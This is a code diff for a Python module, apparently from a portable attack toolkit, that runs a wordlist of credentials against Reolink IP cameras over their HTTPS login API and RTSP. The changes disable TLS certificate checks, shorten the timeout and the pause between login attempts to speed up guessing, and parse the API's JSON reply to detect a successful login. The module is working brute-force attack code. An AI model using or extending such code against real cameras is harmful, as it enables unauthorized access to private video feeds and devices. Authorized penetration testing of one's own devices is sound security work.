@@ -8,13 +8,19 @@ Module interface: run(config, ui_callback, stop_event) -> dict
 """
 
 import os
+import ssl
 import socket
 import json
 import time
 
-HTTP_PORT = 80
+HTTPS_PORT = 443
 RTSP_PORT = 554
-TIMEOUT = 5
+TIMEOUT = 2
+
+# Skip cert verification for self-signed camera certs
+_SSL_CTX = ssl.create_default_context()
+_SSL_CTX.check_hostname = False
+_SSL_CTX.verify_mode = ssl.CERT_NONE
 
 # ── Wordlist loader ──────────────────────────────────────────────────────────
 _BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -45,36 +51,15 @@ def _build_cred_list():
 CRED_LIST = _build_cred_list()
 
 
-def _http_request(ip, port, path, timeout=5):
-    """Minimal HTTP GET without urllib (fewer deps on pager)."""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
-        sock.connect((ip, port))
-
-        request = f"GET {path} HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
-        sock.sendall(request.encode())
-
-        response = b""
-        while True:
-            chunk = sock.recv(4096)
-            if not chunk:
-                break
-            response += chunk
-
-        sock.close()
-        return response.decode(errors="replace")
-    except Exception:
-        return None
 
 
 def _try_reolink_api(ip, user, password, ui_callback):
-    """Try Reolink HTTP API with given credentials."""
-    # Reolink uses a JSON-based API
+    """Try Reolink HTTPS API with given credentials."""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(TIMEOUT)
-        sock.connect((ip, HTTP_PORT))
+        sock.connect((ip, HTTPS_PORT))
+        ssl_sock = _SSL_CTX.wrap_socket(sock, server_hostname=ip)
 
         # Login request
         body = json.dumps([{
@@ -97,20 +82,36 @@ def _try_reolink_api(ip, user, password, ui_callback):
             f"\r\n"
             f"{body}"
         )
-        sock.sendall(request.encode())
+        ssl_sock.sendall(request.encode())
 
         response = b""
         while True:
-            chunk = sock.recv(4096)
+            chunk = ssl_sock.recv(4096)
             if not chunk:
                 break
             response += chunk
 
-        sock.close()
+        ssl_sock.close()
         text = response.decode(errors="replace")
 
-        # Check for success in response
-        if '"code" : 0' in text or '"value"' in text:
+        # Extract JSON body from HTTP response
+        json_start = text.find("[")
+        if json_start == -1:
+            json_start = text.find("{")
+        if json_start >= 0:
+            try:
+                data = json.loads(text[json_start:])
+                if isinstance(data, list):
+                    data = data[0]
+                code = data.get("code", -1)
+                if code == 0:
+                    return True, text
+                return False, text
+            except (json.JSONDecodeError, ValueError):
+                pass
+
+        # Fallback: string matching (firmware-dependent spacing)
+        if '"code" : 0' in text or '"code":0' in text:
             return True, text
 
         return False, text
@@ -155,12 +156,6 @@ def _try_rtsp(ip, user, password):
         return {"error": str(e)}
 
 
-def _try_device_info(ip):
-    """Try to get device info without auth."""
-    resp = _http_request(ip, HTTP_PORT, "/api.cgi?cmd=GetDevInfo")
-    if resp and ("model" in resp.lower() or "name" in resp.lower()):
-        return resp
-    return None
 
 
 def run(config, ui_callback, stop_event=None):
@@ -185,19 +180,12 @@ def run(config, ui_callback, stop_event=None):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(3)
-        s.connect((target_ip, HTTP_PORT))
+        s.connect((target_ip, HTTPS_PORT))
         s.close()
     except Exception:
         ui_callback("[CAMERA] OFFLINE", f"{target_ip} unreachable")
         time.sleep(2)
         return result
-
-    # ── Device Info (no auth) ─────────────────────────────────────────────────
-    ui_callback("[CAMERA]", "Getting device info...")
-    dev_info = _try_device_info(target_ip)
-    if dev_info:
-        result["device_info"] = dev_info[:500]
-        ui_callback("[CAMERA]", "Device info retrieved")
 
     # ── HTTP API Credential Check ─────────────────────────────────────────────
     total = len(CRED_LIST)
@@ -217,7 +205,7 @@ def run(config, ui_callback, stop_event=None):
             time.sleep(0.5)
             return result
 
-        time.sleep(0.05)
+        time.sleep(0.01)
 
     # ── RTSP Check ────────────────────────────────────────────────────────────
     ui_callback("[CAMERA]", "Checking RTSP...")
